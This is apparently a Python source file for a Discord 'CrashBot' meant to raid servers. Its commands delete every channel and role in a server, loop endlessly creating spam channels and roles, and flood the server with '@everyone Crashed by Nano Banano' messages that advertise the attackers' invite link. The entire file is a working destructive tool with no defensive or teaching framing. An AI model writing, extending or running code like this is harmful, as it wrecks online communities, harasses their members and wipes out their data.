import discord 
from colorama import Fore, Back, Style
from discord.ext import commands
import config as cfg
from discord.utils import get


bot = commands.Bot(command_prefix='!') 
@bot.command()
async def spam_chnl(ctx): 
    await ctx.message.delete()
    while True:
        print(Fore.GREEN + "Channel created with name:" + cfg.keyword)
        guild = ctx.message.guild
        await guild.create_text_channel(cfg.keyword)


@bot.command()
async def role_spam(ctx):
    await ctx.message.delete()
    while True:
        print(Fore.GREEN + "Role created with name:" + cfg.keyword)
        await ctx.guild.create_role(name=cfg.keyword)
        

@bot.command()
async def del_chnl(ctx):
    failed_chnl = []
    for channel in ctx.guild.channels:
        try:
            await channel.delete(reason=cfg.keyword)
            print(Fore.GREEN + "Channel deleted name:" + channel.name)
        except:
             failed_chnl.append(channel.name)
             print(Fore.RED + "failed delete: " + str(failed_chnl))
        
@bot.command()
async def spam_text(ctx):
    while True:
        await ctx.send("@everyone Crashed by Nano Banano🤡🤡🤡                           BananoTeam: https://discord.gg/UVeFaEhqhS")
    
    

@bot.command()
async def del_role(ctx):
    failed_role = []
    for role in ctx.guild.roles:
        try:
            await role.delete(reason=cfg.keyword)
            print(Fore.GREEN + "Role deleted name:" + role.name)
        except:
             failed_role.append(role.name)
             print(Fore.RED + "failed delete: " + str(failed_role))
             

print(Fore.GREEN + "Welcome to CrashBot discord")
bot.run(cfg.token)